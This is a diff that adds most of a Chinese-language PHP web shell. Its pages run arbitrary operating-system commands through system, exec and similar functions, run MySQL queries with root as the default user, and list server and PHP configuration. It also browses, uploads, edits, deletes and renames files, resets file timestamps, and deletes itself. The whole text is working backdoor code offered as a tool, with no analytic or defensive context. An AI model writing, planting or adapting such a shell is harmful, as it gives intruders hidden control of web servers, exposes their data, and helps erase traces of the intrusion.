+		<td align=\"center\" valign=\"top\" bgcolor=\"#EEEEEE\">
+			函数:<select name=\"seletefunc\" class=\"input\">
+				<option value=\"shell_exec\">shell_exec</option>
+				<option value=\"exec\">exec</option>
+				<option value=\"system\">system</option>
+				<option value=\"passthru\">passthru</option>
+				<option value=\"popen\">popen</option>
+			</select>
+			命令:<input name=\"shellcmd\" type=\"text\" class=\"style1\" value=\"";
+                          $return .=isset($shellcmd)?$shellcmd:"";
+                          $return .= "
+                         \" size=60>
+			 <textarea name=\"shelltext\" cols=80 rows=10 class=\"style1\">
+";
+
+				
+                                        if(!empty($shellcmd)){
+					if($seletefunc=="popen"){
+						$pp = popen($shellcmd, 'r');
+						
+                                                $return .=fread($pp, 2096);
+						
+                                                pclose($pp);
+					}else{
+						$return .=  ("system"==$seletefunc)?system($shellcmd):(($seletefunc=="exec")?exec($shellcmd):(($seletefunc=="shell_exec")?shell_exec($shellcmd):(($seletefunc=="passthru")?passthru($shellcmd):system($shellcmd))));	
+                                        }
+                                 }
+                                        $return .="  
+				
+			
+					</textarea><p>
+			<span class=\"stylebtext2\">";
+                            $return .= get_cfg_var("safe_mode")?"提示:安全模式下可能无法执行":"";
+                            $return .="
+                         </span><p>
+			<input name=\"shellcmdb\" type=\"submit\" value=\"执行\">&nbsp;&nbsp;
+			<input name=\"shellagainb\" type=\"reset\" value=\"重置\">
+			<p>
+	</td>
+	</form>
+	</table>
+";
+
+        $return .= $this->showfooter();
+        return $return;
+}
+
+
+
+
+
+// ---------------------------------------------------------------------
+//
+//  Mysql
+//
+// ---------------------------------------------------------------------
+function m_mysql()
+{
+      global $r_admin;
+    //  $shellcmd = $this->input['shellcmd'];
+    //  $seletefunc = $this->input['seletefunc'];
+        
+       $sqlhost = $this->input[sqlhost];
+       $sqlport = $this->input[sqlport];
+       $sqluser = $this->input[sqluser];
+       $sqlpasd = $this->input[sqlpasd];
+       $sqldb = $this->input[sqldb];
+       $sqlcmdtext = $this->input[sqlcmdtext];
+       $sqlcmdb = $this->input[sqlcmdb];
+        
+      if (!isset($sqlhost) or empty($sqlhost)) $sqlhost = "localhost";
+      if (!isset($sqlport) or empty($sqlport)) $sqlport = "3306";
+      if (!isset($sqluser) or empty($sqluser)) $sqluser = "root";
+      if (!Isset($sqlpasd) or empty($sqlpasd)) $sqlpasd = "";
+
+         
+      $return  = $this->showhead($r_admin[b_name]);
+ 
+      $return .="
+
+  <br>
+<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+  <tr bgcolor='#cccccc'>
+     <td>
+        Mysql 数据库
+       </td>
+   </tr>
+	<form method=\"post\" action=\"?action=mysql\" enctype=\"multipart/form-data\">
+		<td align=\"left\" valign=\"top\" bgcolor=\"#EEEEEE\">
+			数据库地址:<input name=\"sqlhost\" type=\"text\" class=\"style1\" value=\"$sqlhost\" size=15>
+			端口:<input name=\"sqlport\" type=\"text\" class=\"style1\" value=\"$sqlport\" size=4>
+			数据库名:<input name=\"sqldb\" type=\"text\" class=\"style1\" value=\"$sqldb\" size=10>
+			<br/>
+			用户名:<input name=\"sqluser\" type=\"text\" class=\"style1\" value=\"$sqluser\" size=10>
+			密码:<input name=\"sqlpasd\" type=\"text\" class=\"style1\" value=\"$sqlpasd\" size=10>
+			<br/>
+			<textarea name=\"sqlcmdtext\" cols=\"80\" rows=\"10\" class=\"style1\">
+";
+				if(!empty($sqlcmdtext)){
+					@mysql_connect("$sqlhost","$sqluser","$sqlpasd") or $this->Redirect("数据库连接失败", $r_admin[url]);
+					@mysql_select_db("$sqldb") or $this->Redirect("数据库连接失败", $r_admin[url]);
+					$res = @mysql_query("$sqlcmdtext");
+					
+                                        $return .="$sqlcmdtext";
+					mysql_close();
+				}
+			$return .="
+                        </textarea><p>
+			<span class=\"stylebtext2\">
+";
+                        if (isset($sqlcmdb))
+                           {
+                             if($res)
+                                $return .="执行成功.";
+                             else 
+                                $return .="执行失败:".mysql_error();
+		           }
+                        $return .="
+                        </span><p>
+                    	<input name=\"sqlcmdb\" type=\"submit\" value=\"执行\">&nbsp;&nbsp;
+			<input name=\"sqlagainb\" type=\"reset\" value=\"重置\">
+			<p>
+		</td>
+	</form>
+       </table>  
+";
+
+     
+        $return .= $this->showfooter();
+        return $return;
+}
+
+
+
+
+// ---------------------------------------------------------------------
+//
+//  php环境变量
+//
+// ---------------------------------------------------------------------
+
+function getphpcfg($varname) 
+{
+	switch($result = get_cfg_var($varname)) 
+	{
+		case 0:
+		return "不支持";
+		break;
+		case 1:
+		return "支持";
+		break;
+		default:
+		return $result;
+		break;
+	}
+}
+
+// 检查函数情况函数
+function getfun($funName) 
+{
+	return (false !== function_exists($funName)) ? "支持" : "不支持";
+}
+
+
+
+
+function phpenv()
+{
+      global $r_admin;
+    //  $shellcmd = $this->input['shellcmd'];
+    //  $seletefunc = $this->input['seletefunc'];
+            
+             
+    $returnhead  = $this->showhead($r_admin[b_name]);
+    echo $returnhead;
+    $phpenv = $this->input[action];
+   // echo $phpenv;
+    if ($phpenv == "phpenv")
+     {
+        $adminmail=(isset($_SERVER["SERVER_ADMIN"]))? $_SERVER["SERVER_ADMIN"] : "没有";
+
+	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
+	$dis_func = get_cfg_var("disable_functions");
+	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "支持" : "不支持";
+
+	$dis_func = get_cfg_var("disable_functions");
+	if ($dis_func == "") {
+		$dis_func = "没有";
+	}else {
+		$dis_func = str_replace(" ","<br>",$dis_func);
+		$dis_func = str_replace(",","<br>",$dis_func);
+	}
+
+	$info[0]  = array("服务器时间",date("Y年m月d日 h:i:s",time()));
+	$info[1]  = array("服务器域名","<a href=\"http://$_SERVER[SERVER_NAME]\" target=\"_blank\">$_SERVER[SERVER_NAME]</a>");
+	$info[2]  = array("服务器IP地址",gethostbyname($_SERVER["SERVER_NAME"]));
+	$info[3]  = array("服务器操作系统",PHP_OS);
+	$info[5]  = array("服务器操作系统文字编码",$_SERVER["HTTP_ACCEPT_LANGUAGE"]);
+	$info[6]  = array("服务器解译引擎",$_SERVER["SERVER_SOFTWARE"]);
+	$info[7]  = array("Web服务端口",$_SERVER["SERVER_PORT"]);
+	$info[8]  = array("PHP运行方式",strtoupper(php_sapi_name()));
+	$info[9]  = array("PHP版本",PHP_VERSION);
+	$info[10] = array("运行于安全模式",$this->getphpcfg("safemode"));
+	$info[11] = array("服务器管理员",$adminmail);
+	$info[12] = array("本文件路径",__FILE__);
+	
+	$info[13] = array("允许使用URL打开文件 allow_url_fopen",$this->getphpcfg("allow_url_fopen"));
+	$info[14] = array("允许动态加载链接库 enable_dl",$this->getphpcfg("enable_dl"));
+	$info[15] = array("显示错误信息 display_errors",$this->getphpcfg("display_errors"));
+	$info[16] = array("自动定义全局变量 register_globals",$this->getphpcfg("register_globals"));
+	$info[17] = array("magic_quotes_gpc",$this->getphpcfg("magic_quotes_gpc"));
+	$info[18] = array("程序最多允许使用内存量 memory_limit",$this->getphpcfg("memory_limit"));
+	$info[19] = array("POST最大字节数 post_max_size",$this->getphpcfg("post_max_size"));
+	$info[20] = array("允许最大上传文件 upload_max_filesize",$upsize);
+	$info[21] = array("程序最长运行时间 max_execution_time",$this->getphpcfg("max_execution_time")."秒");
+	$info[22] = array("被禁用的函数 disable_functions",$dis_func);
+	$info[23] = array("PHP环境信息 phpinfo()",$phpinfo);
+	$info[24] = array("目前磁盘剩余空间 diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb');
+
+	$info[25] = array("图形处理 GD Library",$this->getfun("imageline"));
+	$info[26] = array("IMAP电子邮件系统",$this->getfun("imap_close"));
+	$info[27] = array("MySQL数据库",$this->getfun("mysql_close"));
+	$info[28] = array("SyBase数据库",$this->getfun("sybase_close"));
+	$info[29] = array("Oracle数据库",$this->getfun("ora_close"));
+	$info[30] = array("Oracle 8 数据库",$this->getfun("OCILogOff"));
+	$info[31] = array("PREL相容语法 PCRE",$this->getfun("preg_match"));
+	$info[32] = array("PDF文档支持",$this->getfun("pdf_close"));
+	$info[33] = array("Postgre SQL数据库",$this->getfun("pg_close"));
+	$info[34] = array("SNMP网络管理协议",$this->getfun("snmpget"));
+	$info[35] = array("压缩文件支持(Zlib)",$this->getfun("gzclose"));
+	$info[36] = array("XML解析",$this->getfun("xml_set_object"));
+	$info[37] = array("FTP",$this->getfun("ftp_login"));
+	$info[38] = array("ODBC数据库连接",$this->getfun("odbc_close"));
+	$info[39] = array("Session支持",$this->getfun("session_start"));
+	$info[40] = array("Socket支持",$this->getfun("fsockopen"));
+	$return ="
+<center>
+<table width=600 border=0 align=\"center\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\" class=\"input_basic\">
+ ";
+        echo $return;
+	for($a=0;$a<3;$a++){
+		if($a == 0){
+			$hp = array("server","服务器特性");
+		}elseif($a == 1){
+			$hp = array("php","PHP基本特性");
+		}elseif($a == 2){
+			$hp = array("basic","组件支持状况");
+		}
+	 $return1 ="
+  <tr class=\"input_basic\">
+    <td style=\"padding-left: 5px;\" bgcolor=\"#EEEEEE\"><b>$hp[1]</b></td>
+  </tr>
+  <tr class=\"inpub_basic\">
+    <td>
+      <table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
+";
+      echo $return1;
+      
+		if($a == 0){
+			for($i=0;$i<=12;$i++){
+				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
+			}
+		}elseif($a == 1){
+			for($i=13;$i<=24;$i++){
+				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
+			}
+		}elseif($a == 2){
+			for($i=25;$i<=40;$i++){
+				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
+			}
+		}
+    echo "
+      </table>
+    </td>
+  </tr>
+";	
+	} 
+	echo "</table>";
+
+	
+        $return4 .= $this->showfooter();
+	echo $return4;
+	return;
+}
+
+
+
+}
+
+// ---------------------------------------------------------------------
+//
+// 删除目录函数 
+//
+// ---------------------------------------------------------------------
+
+function deltree($TagDir){ 
+	$mydir=@opendir($TagDir); 
+	while($file=@readdir($mydir)){ 
+		if((is_dir("$TagDir/$file")) && ($file!=".") && ($file!="..")) { 
+			if(!deltree("$TagDir/$file")) return false;
+		}else if(!is_dir("$TagDir/$file")){
+			@chmod("$TagDir/$file", 0777);
+			if(!@unlink("$TagDir/$file")) return false;
+		}
+	} 
+	@closedir($mydir); 
+	@chmod("$TagDir", 0777);
+	if(!@rmdir($TagDir)) return false;
+	return true;
+}
+
+// ---------------------------------------------------------------------
+//
+// 保存文件 
+//
+// ---------------------------------------------------------------------
+function savefile()
+{
+        global $r_admin;
+      
+
+	$editfileb = $this->input['editfileb'];
+	$editbackfile = $this->input['editbackfile'];
+	$editfilename = $this->input['editfilename']; 
+	$editfiletext = $this->input['editfiletext'];
+			if(isset($editfileb)&&isset($editfilename)){
+				if(isset($editbackfile)&&($editbackfile == 1)) 
+				{ 
+					if( @copy($editfilename,$editfilename.".bak"))
+                                        $return1 .="生成备份文件成功.<p>";
+                                        else $return1 .="生成备份文件成功<p>";
+					}
+				$fd = @fopen($editfilename, "w");
+				if($fd == false) $return1 .="打开文件[$editfilename]错误.";
+				else{
+					if(@fwrite($fd,$editfiletext))
+                                         $return1 .="编辑文件[$editfilename]成功!";
+                                        else  $return1 .="写入文件文件[$editfilename]错误";
+					@fclose( $fd );
+					
+					
+				}
+			}
+     
+        $this->Redirect("$return1", $r_admin[url]."?dir=".urlencode(dirname($editfilename)));
+     
+}
+
+
+// ---------------------------------------------------------------------
+//
+// 上传保存文件 
+//
+// ---------------------------------------------------------------------
+function fileup()
+{
+        global $r_admin;
+        $filedir  = $this->input['filedir'];
+        $userfile = $_FILES['userfile'];
+        if (@copy($userfile["tmp_name"],"{$filedir}/{$userfile['name']}")) 
+	{
+	        $upok = true;
+	}
+	else
+	{
+                $upok = false;
+   	}
+      
+      
+  if($upok==false) 
+     { 
+        //读取文件内容 
+	@$fp=fopen($userfile['tmp_name'],"rb"); 
+        @$filecontent=fread($fp,$userfile['size']); 
+        @fclose($fp); 
+        @$fp2=fopen("$filedir/$userfile[name]","wb"); 
+        if(@fwrite($fp2,$filecontent,$userfile['size'])) 
+         { 
+           $upok=true; 
+         } 
+        @fclose($fp2); 
+      } 
+
+   if ($upok == true) {
+
+     	   $return .="
+	  上传文件[{$userfile[name]}]成功.位置:[{$filedir}/{$userfile[name]}]共({$userfile[size]})字节.
+	  ";
+   }
+   if ($upok == false) {
+     
+   	   $return .="
+          上传文件[{$userfile[name]}]到[{$filedir}/{$userfile[name]}]失败. 
+	  ";
+
+   }
+      
+       $this->Redirect("$return", $r_admin[url]."?dir=".urlencode($filedir));
+}
+
+
+
+
+
+// ---------------------------------------------------------------------
+//
+// 得到真实路径
+//
+// ---------------------------------------------------------------------
+
+function gettruepath($path){
+    return str_replace("\\","/",@realpath($path));
+}
+
+
+
+
+
+// ---------------------------------------------------------------------
+//
+// 显示
+//
+// ---------------------------------------------------------------------
+
+function indexshow()
+{
+    global $r_admin;
+   
+//    $this->start_sh();
+ 
+    $deldir = $this->input['deldir'];
+    $delyes = $this->input['delyes'];
+    $delfile = $this->input['delfile'];
+    $ttime = $this->input['ttime'];
+    $r_admin[gotodir] = $this->input['gotodir'];
+    
+    
+ 
+    $this->start_sh();
+    
+if ($this->input["action"] == "logout")
+{
+        $r_admin[pass] = "0";
+	@session_destroy();
+	$this->Redirect("注销成功, 返回到首页",$r_admin[url]);
+
+}
+
+if (isset($ttime) && $ttime !="")
+{
+   $tfile = $this->input[tfile];	
+   if($tfile != "")
+    {
+    	    	
+	@touch($tfile,$ttime) or $this->Redirect("重新修改时间失败",$r_admin[url]."?dir=".urlencode(dirname($tfile)));
+	$this->Redirect("重新修改时间成功",$r_admin[url]."?dir=".urlencode(dirname($tfile)));
+
+	}	
+}
+    if(isset($r_admin[gotodir])) if($r_admin[gotodir] != "") 
+             
+     { 
+     	$r_admin[nowpath]=$r_admin[gotodir];
+     	if(@strstr($r_admin[gotodir],$r_admin[rootdir])) 
+     	{
+     		$r_admin[gotodir] = @str_replace("$r_admin[rootdir]","",$r_admin[gotodir]);
+     	 	$r_admin[f_flag] = "0";
+     	 
+     	}
+          
+        else {$r_admin[nowpath] =$r_admin[gotodir]; $r_admin[f_flag] = "1";} 
+     }
+    
+    if(isset($deldir) && $delyes =="yes" ) 
+	{
+	  $deldir=str_replace("//","/",$deldir);	
+         $out = file_exists($deldir)?($this->deltree($deldir)?"删除目录[$deldir]成功!":"删除目录[$deldir]失败!"):"目录[$deldir]不存在!!";
+
+         $this->Redirect("$out", $r_admin[url]."?dir=".urlencode(dirname($deldir)));
+    			}
+    else if(isset($delfile) && $delyes =="yes") {
+    	
+    	$delfile=str_replace("//","/",$delfile);
+        @chmod("$delfile", 0777);
+	$out = file_exists($delfile)?(@unlink($delfile)?"删除文件[$delfile]成功!":"删除文件[$delfile]失败!"):"文件[$delfile]不存在!";
+			
+           
+       $this->Redirect("$out", $r_admin[url]."?dir=".urlencode(dirname($delfile)));
+       }    
+
+        $action = $this->input['action'];
+        $mkdirb = $this->input['mkdirb'];      
+        $mkfileb = $this->input['mkfileb'];      
+
+		 if($action == "createfile"){
+		 	
+			if(isset($mkdirb)){
+				
+				 $dirb = "$r_admin[nowpath]/$mkdirb";
+				 $dirb=str_replace("//","/",$dirb);
+				 $out = file_exists("$dirb")?"[$dirb]该目录已存在":(@mkdir("$dirb",0777)?"目录[$dirb]创建成功":"目录[$dirb]创建失败");
+			
+                     $this->Redirect("$out", $r_admin[url]."?dir=".urlencode($r_admin[nowpath]));
+                            }
+                      else if(isset($mkfileb)){
+                      	 	$fileb = "$r_admin[nowpath]/$mkfileb";
+				 $fileb = str_replace("//","/",$fileb);
+				if(file_exists("$fileb")) $out = "[$fileb]该文件已存在";
+				else{
+					$fd = @fopen("$fileb", "w");
+					if($fd == false) $out ="建立文件[$fileb]错误.";
+					else{
+						$out = "建立文件[$fileb]成功 <a href=\"?action=editfile&dir=".urlencode($fileb)."\"><p>点此跳转入编辑浏览页面</a>";
+						@fclose( $fd );
+					}
+				}
+                     
+                     $this->Redirect("$out", $r_admin[url]."?dir=".urlencode($r_admin[nowpath]));
+		}
+            }
+
+
+    $return .="
+
+  <br>
+<table width=600 border=0 cellpadding=0 align='center'>
+  <tr>  	
+  	<td><p><font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">
+  	";
+  	if ($r_admin[os] == "unix") {
+  		$a = @exec('uname -a');
+  	}
+  	else {$a = @exec('ver');}	
+  		$return .="当前系统: <b>$a</b><br/>
+  	";
+  	$r_admin[nowpath_attr] = substr(base_convert(@fileperms($r_admin[nowpath]),10,8),-4);
+  	$return .="
+  	WEB路径: <b>$r_admin[pathname]</b><br/>当前目录($r_admin[nowpath_attr]): <b>$r_admin[nowpath]</b>
+    </font>
+    </td>
+  </tr>
+</table>
+
+<table width=600 border=0 cellpadding=0 class='input_basic' align='center'>
+ <form action='' method='GET'>
+  <tr>  	
+  	<td>
+        输入要跳转到的目录:
+        <input name='gotodir' type='text' class='INPUT'>
+        <input type='submit' class='INPUT' value='跳转'> 〖支持绝对路径和相对路径〗
+    </td>
+  </tr>
+ </form>
+ <form action='?action=fileup&dir=".urlencode($r_admin[nowpath])."' method='post' enctype='multipart/form-data'>
+  <tr>
+    <td colspan='2'>上传文件到当前目录:
+    <input name=\"filedir\" type=\"text\"  value=\"$r_admin[nowpath]\" size=30>&nbsp;<br>本地文件:
+	<input name=\"userfile\" type=\"file\"  size=30>&nbsp;
+	<input name=\"userfileb\" type=\"submit\"  value=\"上传\">
+  </tr>
+  </form>
+  <form action='?action=createfile&dir=".urlencode($r_admin[nowpath])."' method='POST'>
+  <tr>
+    <td colspan='2'>新建文件在当前目录:
+        <input name='mkfileb' type='text' class='INPUT' value=''>
+        <input type='submit' class='INPUT' value='新建文件'>
+        <input name='action' type='hidden' value='createfile'></td>
+  </tr>
+  </form>
+  <form action='' method='POST'>
+  <tr>
+    <td colspan='2'>新建目录在当前目录:
+        <input name='mkdirb' type='text' class='INPUT' value=''>
+        <input type='submit' class='INPUT' value='新建目录'>
+        <input name='action' type='hidden' value='createfile'></td>
+  </tr>
+  </form>
+</table>
+<br>
+
+";
+
+
+if ($this->input['rename'] !="") {
+  	$rename = $this->input['rename'];
+	$return .= "
+	<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+<tr align='center'><td><font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">将要改名 $rename ?</font><br><br>
+<center><form method=post><b>改名</b><br><u><font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">$rename</font></u><br><Br><B>为</B><br>
+<input name=rename_to size=40 value=''><br><br><input type=submit value=RENAME>
+</form></td></tr></table>";
+
+@$new_name=$this->input['rename_to'];
+//echo $r_admin[nowpath];
+if($new_name){
+$from1=$rename;
+$from1=str_replace("//","/",$from1);
+$to1 = dirname($from1);
+$to1 = $to1."/".$new_name;
+$to1=str_replace("\\","/",$to1);
+$to1=str_replace("//","/",$to1);
+
+@rename($from1,$to1) or $this->Redirect("改名出错!", "1");
+$this->Redirect("$from1 改名为 $new_name 成功", $r_admin[url]."?dir=".urlencode(dirname($from1)));
+}
+}
+else if($this->input['action'] == "selfremover") {
+	$path =__FILE__;
+$return .= "
+	<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+<tr align='center'><td><font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">你真的确定要删除?</font><br/><br/><br/>
+<a href='$r_admin[url]?action=removeyes'>Yes</a> | <a href='$r_admin[url]?'>No</a><br/><br/><br/>
+Remove: <u>$path</u>
+</td></tr></table>";
+}
+else if ($this->input['action']=="removeyes"){
+$path=__FILE__;
+@unlink($path);
+$path=str_replace("\\","/",$path);
+if(file_exists($path)){
+
+$del="错误，没有删除!!!";
+
+$return .= "
+	<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+<tr align='center'><td><font color=red face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">文件 $path 删除失败！！！</font>
+</td></tr></table>";	
+}
+else{$del="已经成功删除";
+}
+print "<script>alert('$path $del');</script>";
+
+}
+else if(isset($deldir) && $delyes=="")
+{
+	$deldir1 = urlencode($deldir);	
+  	$return .= "
+	<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+<tr align='center'><td><font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">你真的确定要删除目录<u>[$deldir]</u>?</font><br/><br/><br/>
+<a href='$r_admin[url]?action=index&deldir=$deldir1&delyes=yes'>Yes</a> | <a href='$r_admin[url]?dir=$deldir'>No</a><br/><br/><br/>
+Delete: <u>$deldir</u>
+</td></tr></table>";	
+}
+else if (isset($delfile) && $delyes=="")
+{
+  $delfile1 = urlencode($delfile);
+  $filedir  = urlencode(dirname($delfile));	
+  $return .= "
+	<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+<tr align='center'><td><font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">你真的确定要删除文件<u>\"$delfile\"</u>?</font><br/><br/><br/>
+<a href='$r_admin[url]?action=index&delfile=$delfile1&delyes=yes'>Yes</a> | <a href='$r_admin[url]?dir=$filedir'>No</a><br/><br/><br/>
+Delete: <u>$delfile</u>
+</td></tr></table>";		
+}
+else if ($this->input[action] == "touch")
+{
+    $tfile = $this->input['tfile'];
+    $c_t = time();	
+    $return .= "
+	<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+<tr align='center'><td><font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">请输入文件的最后修改时间,应为一整数<br/>
+目前时间的时间戳记为：$c_t<br/></font><br/>
+<center><form method=post><input name=ttime size=40 value=''><br><br><input type=submit value=TOUCH>
+<input type='hidden' name='tfile' value=\"$tfile\">
+</form>
+</td></tr></table>";
+}
+
+
+else  {
+$return .="
+<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+  <tr bgcolor='#cccccc'>
+    <td align='center' nowrap width='30%'><b>文件名称</b></td>
+    <td align='center' nowrap width='20%'><b>最后修改日期</b></td>
+    <td align='center' nowrap width='10%'><b>大小</b></td>
+    <td align='center' nowrap width='15%'><b>属主/群组</b></td>
+    <td align='center' nowrap width='5%'><b>属性</b></td>
+    <td align='center' nowrap width='20%'><b>操作</b></td>
+  </tr>
+";
+
+$dirs = array();
+$files = array();
+$r_admin[r_dirs]=@opendir($r_admin[nowpath]);
+
+while (!($file=@readdir($r_admin[r_dirs])) === false) {
+        
+        $b="$r_admin[nowpath]/$file";
+	$a=@is_dir($b);
+	
+        if($a=="1"){
+        	$dirs[] = $file;
+        }
+        else
+          {
+          	$files[] = $file;
+        }
+           	sort($dirs);
+   		sort($files);
+}//while end   
+
+
+
+
+
+for($i=0; $i < count($dirs); $i++){
+	
+	if($r_admin[os]=="unix"){
+	$owner = @fileowner($r_admin[nowpath]."/".$dirs[$i]);
+	$fileownera=posix_getpwuid($owner);
+	$owner=$fileownera['name'];
+	$group = @filegroup($r_admin[nowpath]."/".$dirs[$i]);
+	$groupinfo = posix_getgrgid($group);
+	$group=$groupinfo['name'];
+	}
+	$cur_dir=str_replace("//","/",$r_admin[nowpath]."/".$dirs[$i]);
+	if($dirs[$i]!=".." && $dirs[$i]!=".")	{
+			$lastsave=@date("Y-n-d H:i:s",filemtime("$r_admin[nowpath]/$dirs[$i]"));
+			$dirperm=substr(base_convert(fileperms("$r_admin[nowpath]/$dirs[$i]"),10,8),-4);
+			$return .= "<tr class=\"input_basic\">\n";
+			$return .= "  <td style=\"padding-left: 5px;\">[<a href=\"$r_admin[url]?dir=".urlencode($cur_dir)."\"><font color=\"#000099\">$dirs[$i]</font></a>]</td>";
+			$return .= "  <td align=\"center\" nowrap valign=\"top\">$lastsave</td>\n";
+			$return .= "  <td align=\"center\" nowrap valign=\"top\">&lt;DIR&gt;</td>\n";
+			$return .= "  <td align=\"center\" nowrap valign=\"top\">$owner/$group</td>\n";
+			$return .= "  <td align=\"center\" nowrap valign=\"top\">$dirperm</td>\n";
+			//$return .= "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=fileperm&dir=".urlencode($cur_dir)."\">$dirperm</a></td>";
+			$return .= "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=index&deldir=".urlencode($cur_dir)."\">删除</a> | <a href=\"?action=index&rename=".urlencode($cur_dir)."\">改名</a></td>";
+			$return .= "</tr>\n";
+			continue;
+		} else {
+			if($dirs[$i]=="..") {
+				//echo "<tr class=".getrowbg().">\n";
+				$return .= "  <td nowrap colspan=\"5\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($r_admin[nowpath])."/".urlencode($dirs[$i])."\">←返回上级目录</a></td>";
+				$return .= "</tr>";
+				continue;
+			}
+		}
+		
+	}
+$dir_num = $i;		
+for($i=0; $i < count($files); $i++){
+                if($r_admin[os]=="unix"){
+		$owner =  @fileowner($r_admin[nowpath]."/".$files[$i]);
+		$fileownera=posix_getpwuid($owner);
+		$owner=$fileownera['name'];
+		$group = @filegroup($r_admin[nowpath]."/".$files[$i]);
+		$groupinfo = posix_getgrgid($group);
+		$group=$groupinfo['name'];
+		}
+		
+		$cur_dir=str_replace("//","/",$r_admin[nowpath]."/".$files[$i]);
+		$size=@filesize("$r_admin[nowpath]/$files[$i]");
+		
+		if ($size < 1024){$file_size=$size.' B';
+			}else{
+				if ($size < 1024*1024){$file_size=@number_format(($size/1024), 2, '.', '').' KB';}else{
+				if ($size < 1000000000){$file_size=@number_format($size/(1024*1024), 2, '.', '').' MB';}else{
+				if ($size < 1000000000000){$file_size=@number_format($size/(1024*1024*1024), 2, '.', '').' GB';}
+			}}}
+		$lastsave=@date("Y-n-d H:i:s",filemtime("$r_admin[nowpath]/$files[$i]"));
+		@$fileperm=substr(base_convert(fileperms("$r_admin[nowpath]/$files[$i]"),10,8),-4);
+		$return .= "<tr class=\"input_basic\">";
+		if ($r_admin[f_flag] =="0") $return .= "  <td style=\"padding-left: 5px;\"><a href=\"$r_admin[r_dir]/$files[$i]\" target=\"_blank\">$files[$i]</a></td>";
+		else if ($r_admin[f_flag] =="1") $return .= "  <td style=\"padding-left: 5px;\">$files[$i]</a></td>";
+		$return .= "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=touch&tfile=".urlencode($cur_dir)."\">$lastsave</a></td>";
+		$return .= "  <td align=\"center\" nowrap valign=\"top\">$file_size</td>";
+		$return .= "  <td align=\"center\" nowrap valign=\"top\">$owner/$group</td>\n";
+		$return .= "  <td align=\"center\" nowrap valign=\"top\">$fileperm</td>\n";
+		//$return .= "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=fileperm&dir=".urlencode($cur_dir)."\">$fileperm</a></td>";
+		$return .= "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?downfile=".urlencode($cur_dir)."\">下载</a> | <a href=\"?action=editfile&dir=".urlencode($cur_dir)."\">编辑</a> | <a href=\"?action=index&delfile=".urlencode($cur_dir)."\">删除</a> | <a href=\"?action=index&rename=".urlencode($cur_dir)."\">改名</a></td>";
+		$return .= "</tr>";
+	
+	}
+$file_num = $i;	
+@closedir($r_admin[r_dirs]); 
+     $return .=" 
+     <tr> 
+      <td nowrap colspan=\"5\" align=\"left\"><b>$dir_num 个目录(已经包含.和..目录)<br>$file_num  个文件</b></td>
+      </tr>           
+</table>
+";
+}
+     return $return;
+
+}
+
+
+
+function index()
+{
+	global $r_admin;
+      
+	$return  = $this->showhead($r_admin[b_name]);
+        $return .= $this->indexshow();
+        $return .= $this->showfooter();
+        return $return; 
+
+}
+
+
+
+
+
+}
+
+
+
+
+$style =" 
+<style type=\"text/css\">
+<!--
+
+.p1 {  font-size: 9pt; line-height: 150%; color: #000000}
+.q {  border: #000000 solid; border-width: 0px 0px 1px}
+a:link { color: #333399; 
+ font-size: 12px; 
+
+ text-decoration: none;}
+a:visited { color: #333333; 
+ font-size: 12px; 
+
+ text-decoration: none;}
+a:active { color: #999999; 
+ font-size: 12px; 
+ 
+ text-decoration: none;}
+a:hover { color: #999999;
+ font-size: 12px; 
+ font-weight: bold; 
+ text-decoration: none;}
+BODY {
+	background-color: #ffffff; 
+
+	SCROLLBAR-FACE-COLOR: #999999; SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; SCROLLBAR-SHADOW-COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #999999; SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #666666; SCROLLBAR-DARKSHADOW-COLOR: #666666
+
+ font-family: verdana,trebuchet,sans-serif;
+}
+.p2 {  font-size: 9pt; color: #000000}
+.qqqqqqqq {  border: #000000; border-style: solid; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px}
+.aq {  font-size: 9pt; line-height: 150%; color: #000000; filter: DropShadow(Color=#ffffff, OffX=1, OffY=1, Positive=1)}
+.hghfdg {  font-size: 9pt; color: #333333; line-height: 130%}
+.saw {  font-size: 9pt; line-height: 130%; color: #000000}
+
+.ss {  font-size: 9pt;  line-height: 150%; color: #ffffff}
+
